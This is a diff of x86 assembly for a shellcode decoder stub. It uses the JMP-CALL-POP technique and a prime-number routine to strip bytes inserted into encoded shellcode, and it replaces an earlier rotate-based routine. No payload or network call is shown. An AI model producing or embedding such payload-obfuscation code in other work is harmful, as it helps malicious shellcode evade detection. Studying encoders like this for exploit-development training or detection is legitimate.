@@ -5,21 +5,26 @@ global _start
 
 section .text
 
+_start:
+	jmp short caller
+
 IsPrime:
         push ebp
         mov ebp, esp
 
         mov esi, 0x01           ; (ESI) -> range from 1 to NUMBER
 	mov cl, [esp+8]		; (ECX) -> loop counter
+	xor eax, eax		; clear register
+	xor edi, edi		; clear register
 
         ..@loopPrime:
                 xor ebx, ebx	; clear register
+                xor edx, edx	; clear register
                 mov ax, [esp+8]	; AX -> suppose prime number (dividend)
                 div si          ; SI -> range NUMBER (divisor)
                 cmp dl, dh      ; check if remainder is ZERO 
                 setz bl		; set if remainder is ZERO
                 add edi, ebx 	; [EDI] -> number of operations with ZERO remainder
-                xor edx, edx	; clear register
                 inc si          ; next divisor
 
                 loop ..@loopPrime
@@ -34,18 +39,12 @@ IsPrime:
                 leave
                 ret
 
-rotate:
-	mov edx, [esp+8]
-	lea esi, [edx]		; (ESI) -> loads memory address for first byte of shellcode
-	lodsb
-	rcl eax, 1
-	stosb
-	jmp ..@returnDecoder
-
 decoder:
         pop esi			; (ESI) -> memory address for first byte of shellcode
 	inc esi			; avoids BYTE 0x01
 	push esi		; (ESI) -> saves register
+	
+	xor ebx, ebx
 	
         mov cl, 0x48		; (ECX) -> loop counter, shellcode size
         mov bl, 0x02		; (EBX) -> processor register to interact with each byte of shellcode
@@ -57,15 +56,22 @@ decoder:
 					; returns 0x00 -> compositive number
 					; returns BYTE <> 0 -> the prime number
 		cmp ebx, edx		; (EBX) -> verify if is a compositive number
-		jnz rotate
+		jz ..@return
+		mov edx, [esp+8]
+		lea esi, [edx]		; (ESI) -> source byte
+		add esi, 0x2
+		lea edi, [edx]		; (EDI) -> destination byte
+		add edi, 0x01		
+		lodsb			; ESI
+		stosb			; EDI
 
-	..@returnDecoder:
+		..@return:
 		pop ebx			; (EBX) -> restore register
 		inc ebx			; (EBX) -> interact with next BYTE
 		pop ecx			; (ECX) -> restore register
 		loop ..@loopDecoder 	; (ECX) -> counter is decreased
 
-_start:
+caller:
         call decoder
 ; 72 bytes 0x48 (before insertion)
 ; 92 bytes 0x5c (after insertion) 
